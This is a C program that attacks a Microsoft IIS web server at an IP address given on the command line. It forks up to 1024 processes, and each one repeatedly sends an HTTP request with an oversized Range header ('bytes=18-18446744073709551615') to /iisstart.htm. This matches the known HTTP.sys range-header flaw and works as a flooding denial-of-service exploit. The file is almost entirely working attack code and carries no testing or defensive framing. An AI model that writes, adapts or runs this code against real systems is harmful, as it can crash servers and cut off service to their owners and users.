#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/wait.h>  // Include this header for the wait() function

#define MAX_PROCESSES 1024  // Define a reasonable limit to prevent system overload

void send_payload(const char *host, const char *payload) {
    int sockfd;
    struct sockaddr_in serv_addr;
    char buffer[1024];

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(80);

    // Convert IPv4 address from text to binary form
    if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Send the payload
    send(sockfd, payload, strlen(payload), 0);

    // Read response (optional)
    read(sockfd, buffer, sizeof(buffer));

    // Close the socket
    close(sockfd);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <IP_ADDRESS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *host = argv[1];
    const char *init_payload = "GET /iisstart.htm HTTP/1.0\r\n\r\n";
    const char *exploit_payload = "GET /iisstart.htm HTTP/1.1\r\nHost: blah\r\nRange: bytes=18-18446744073709551615\r\n\r\n";
    
    pid_t pid;
    int process_count = 0;

    while (process_count < MAX_PROCESSES) {
        pid = fork();

        if (pid == 0) {
            // Child process
            while (1) {
                send_payload(host, init_payload);
                send_payload(host, exploit_payload);
                usleep(500000);  // Sleep for 0.5 seconds
            }
            exit(0);  // Just in case loop is broken, terminate child
        } else if (pid < 0) {
            perror("Fork failed");
            return EXIT_FAILURE;
        }

        process_count++;
    }

    // Parent process waits for children
    for (int i = 0; i < process_count; i++) {
        wait(NULL);
    }

    return 0;
}
